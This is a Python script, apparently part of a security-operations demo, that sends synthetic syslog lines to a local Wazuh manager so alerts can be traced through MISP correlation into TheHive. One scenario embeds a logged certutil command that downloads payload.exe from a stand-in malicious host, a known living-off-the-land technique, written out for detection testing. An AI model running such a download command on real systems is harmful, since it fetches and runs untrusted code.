#!/usr/bin/env python3
"""
Fires a handful of synthetic log lines at the local Wazuh manager over
syslog (UDP 514) so you can watch an alert travel through the whole
pipeline — Wazuh rule match -> enrichment -> correlation -> triage ->
TheHive case — without waiting for a real attack or a real scanner.

This intentionally reuses the SAME demo IOCs seeded by seed_misp.py
(203.0.113.50, malicious-example.test) so the correlation step has a
guaranteed MISP hit to show off.

Usage:
    python3 scripts/generate_demo_alert.py --target localhost --scenario brute_force
    python3 scripts/generate_demo_alert.py --target localhost --scenario lolbin
"""

from __future__ import annotations

import argparse
import socket
import time

SCENARIOS = {
    "brute_force": [
        "sshd[1234]: Failed password for invalid user admin from 203.0.113.50 port 51515 ssh2"
        for _ in range(9)
    ],
    "lolbin": [
        "Sysmon: ProcessCreate: Image=C:\\Windows\\System32\\certutil.exe "
        'CommandLine="certutil.exe -urlcache -split -f http://malicious-example.test/payload.exe" '
        "ParentImage=C:\\Windows\\System32\\cmd.exe"
    ],
    "benign_scan": [
        "sshd[5678]: Failed password for invalid user test from 10.10.50.7 port 51515 ssh2" for _ in range(9)
    ],
}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="localhost")
    parser.add_argument("--port", type=int, default=514)
    parser.add_argument("--scenario", choices=SCENARIOS.keys(), default="brute_force")
    parser.add_argument("--delay", type=float, default=0.3, help="seconds between lines")
    args = parser.parse_args()

    lines = SCENARIOS[args.scenario]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"Sending {len(lines)} line(s) for scenario '{args.scenario}' to {args.target}:{args.port}")
    for line in lines:
        sock.sendto(line.encode("utf-8"), (args.target, args.port))
        time.sleep(args.delay)

    print("Done. Check the Wazuh dashboard / TheHive within a few seconds for the resulting case.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
